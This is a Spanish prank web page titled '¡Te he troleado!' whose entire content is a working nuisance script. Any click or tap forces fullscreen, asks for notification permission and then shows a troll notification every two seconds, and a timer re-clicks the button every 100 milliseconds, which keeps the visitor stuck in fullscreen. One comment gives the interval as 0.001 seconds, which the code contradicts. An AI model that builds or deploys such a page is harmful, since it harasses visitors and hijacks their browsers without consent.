<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Te he troleado!</title>
    <style>
        body {
            margin: 0;
            background-color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }

        h1 {
            font-size: 3em;
            color: red;
        }

        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 1.2em;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>copilot!</h1>
    <button id="fullscreenButton" onclick="activarPantallaCompleta()">entrar</button>

    <script>
        function activarPantallaCompleta() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) {
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }

            solicitarPermisosNotificaciones(); // Activar notificaciones
            iniciarAutoClick(); // Activar el auto-click después del permiso
        }

        // Solicitar permisos de notificación
        function solicitarPermisosNotificaciones() {
            if ("Notification" in window) {
                Notification.requestPermission().then(permission => {
                    if (permission === "granted") {
                        setInterval(() => {
                            new Notification("¡Te he troleado!");
                        }, 2000); // Notificaciones cada 2 segundos
                    }
                });
            }
        }

        // Activar auto-click cada 0.001 segundos después del permiso del usuario
        function iniciarAutoClick() {
            setInterval(() => {
                document.getElementById("fullscreenButton").click();
            }, 100); // Auto-click cada 0.1 segundos
        }

        // Detectar interacción del usuario y ejecutar la función
        document.addEventListener("click", activarPantallaCompleta);
        document.addEventListener("touchstart", activarPantallaCompleta);
    </script>
</body>
</html>
